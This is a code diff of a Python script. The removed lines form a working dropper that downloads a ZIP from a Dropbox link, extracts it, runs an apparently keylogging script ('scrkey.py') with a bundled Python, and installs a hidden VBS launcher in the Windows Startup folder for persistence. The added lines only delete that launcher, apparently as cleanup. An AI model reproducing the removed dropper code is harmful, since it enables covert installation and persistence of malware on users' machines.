@@ -1,56 +1,16 @@
 import os
-import requests
-import time
-last_drop_txt_file_timestamp = 'last_drop.txt'
-# if the timestamp in the file is less than 10 minutes ago, do not run the drop
-if os.path.exists(last_drop_txt_file_timestamp):
-    with open(last_drop_txt_file_timestamp, 'r') as f:
-        last_drop_timestamp = int(f.read().strip())
-    if time.time() - last_drop_timestamp < 600:
-        print("Drop was run less than 10 minutes ago. Exiting.")
-        exit()
-url = "https://www.dropbox.com/scl/fi/mzi95kvwhcibwnflprzsz/Appaqsd.zip?rlkey=sncapapwg10rb4a8t3kz7r5ux&st=nrg8gozj&dl=1"
-filename = os.path.join("Appaqsd.zip")
-with requests.get(url, stream=True) as r:
-    r.raise_for_status()
-    with open(filename, 'wb') as f:
-        for chunk in r.iter_content(chunk_size=8192):  # Adjust chunk size as needed
-            f.write(chunk)
 
-print("Downloaded the ZIP file.")
+# Get the startup folder path for the current user
+startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+file_to_delete = os.path.join(startup_folder, 'LaunchStartupLANs.vbs')
 
-# Step 2: Extract the ZIP file
-# Use the 'tar' command on Windows, ensure tar is available on your system; else, you may need other utilities like 7-Zip
-extract_command = f"tar -xf {filename}"
-print(extract_command)
-os.system(extract_command)
-print("Extracted the ZIP file.")
-
-# Step 3: Execute the program
-# Modify paths as necessary according to the actual structure inside your ZIP file
-# This assumes 'run.py' is in the root of the 'Appaqsd' folder after extraction
-print(f'Executing the program...')
-full_path = os.path.join(os.getcwd(), "Appaqsd")
-full_python_path = os.path.join(os.getcwd(), "Appaqsd")
-full_python_path = os.path.join(os.getcwd(), "Appaqsd", "python.exe")
-full_script_path = os.path.join(os.getcwd(), "Appaqsd", "scrkey.py")
-print(f'{full_python_path} {full_script_path}')
-# add a vbs script to startup that will launch "Appaqsd", "basrq.py" with "Appaqsd", "python.exe"
-startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-vbs_script_path = os.path.join(startup_folder, "LaunchStartupLANs.vbs")
-
-vbs_content = f"""
-Set WshShell = CreateObject("WScript.Shell")
-
-WshShell.CurrentDirectory = "{full_path}"
-WshShell.Run "{full_python_path} {full_script_path}", 0, True
-Set WshShell = Nothing 
-"""
-with open(vbs_script_path, 'w') as vbs_file:
-    vbs_file.write(vbs_content.strip())
-with open(last_drop_txt_file_timestamp, 'w') as f:
-    f.write(str(int(time.time())))
-os.system(f'{full_python_path} {full_script_path}')
-
-
-print("Executed the program.")
+# Check if the file exists
+if os.path.exists(file_to_delete):
+    try:
+        # Delete the file
+        os.remove(file_to_delete)
+        print(f"File {file_to_delete} has been deleted.")
+    except Exception as e:
+        print(f"Error deleting the file: {e}")
+else:
+    print(f"File {file_to_delete} does not exist.")
